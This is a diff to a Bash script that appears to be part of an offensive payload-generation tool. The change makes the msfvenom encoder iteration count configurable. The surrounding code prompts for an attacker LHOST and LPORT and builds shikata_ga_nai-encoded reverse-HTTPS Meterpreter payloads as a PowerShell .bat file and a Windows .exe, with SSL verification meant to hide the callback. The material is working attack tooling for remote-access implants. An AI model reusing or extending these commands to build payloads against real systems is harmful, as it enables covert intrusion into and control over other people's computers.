@@ -29,8 +29,9 @@
 #                                           |
 V3R="1.2"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
-ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use (3 interactions)
-ChEk_DB="OFF"                               # Rebuild metasploit database (postgresql) on start?
+ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
+ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload
+ENCODE_NUMB="3"                             # How many interactions to encode payload
 # __________________________________________|
 
 
@@ -268,7 +269,7 @@ if [ "$BuIlD" = "staged (payload.bat)" ]; then
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 220) > /dev/null 2>&1
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows -a x86 --smallest -e $ENCODE -i 3 -f psh-cmd -o paranoid-staged.bat
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows -a x86 --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.bat
 
       #
       # head - paranoid-staged.bat
@@ -312,7 +313,7 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
     LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
     paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 170) > /dev/null 2>&1
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows -a x86 --smallest -e $ENCODE -i 3 -f exe -o paranoid-stageless.exe
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows -a x86 --smallest -e $ENCODE -i $ENCODE_NUMB -f exe -o paranoid-stageless.exe
     sleep 2
 
 
